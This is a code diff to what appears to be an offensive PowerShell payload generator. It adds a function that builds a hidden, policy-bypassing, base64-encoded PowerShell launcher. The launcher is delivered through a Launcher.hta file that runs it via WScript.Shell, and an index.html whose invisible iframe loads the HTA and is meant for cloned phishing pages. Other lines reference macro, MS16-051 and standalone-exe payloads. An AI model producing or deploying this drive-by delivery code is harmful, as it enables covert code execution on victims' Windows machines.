@@ -510,6 +510,34 @@ UpdateMacro'
     }
 }
 
+# create HTA payload
+function CreateHTAPayload
+{
+
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
+    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payload = $payloadraw -replace "`n", ""
+    
+    #HTA index file generation
+    # output simple html for loading HTA. This could be used with any cloned web page.
+    # host this HTML and Launcher.HTA on a web server.
+    # HTA Payload taken from https://github.com/trustedsec/unicorn , minus the obfuscation
+    $HTMLCode = '<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>'
+    $HTMLFile = "$global:newdir\payloads\index.html"
+    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
+
+    #HTA Payload file generation
+    $HTMLCode = @"
+    <script>
+    ao=new ActiveXObject("WScript.Shell");
+    ao.run('%windir%\\System32\\' + "cmd.exe" + ' /c powershell $payloadraw', 0);window.close();
+    </script>
+"@
+    $HTMLFile = "$global:newdir\payloads\Launcher.hta"
+    Out-File -InputObject $HTMLCode -Encoding ascii -FilePath $HTMLFile
+    Write-Host -Object "HTA Payload written to: $global:newdir\index.html and Launcher.hta"  -ForegroundColor Green
+}
+
 # create MS16-051 payload
 function Create-MS16-051-Payload
 {
@@ -1016,6 +1044,7 @@ primer | iex }'
     # create other payloads
 
     CreatePayload
+    CreateHTAPayload
     CreateMacroPayload
     Create-MS16-051-Payload
     CreateStandAloneExe
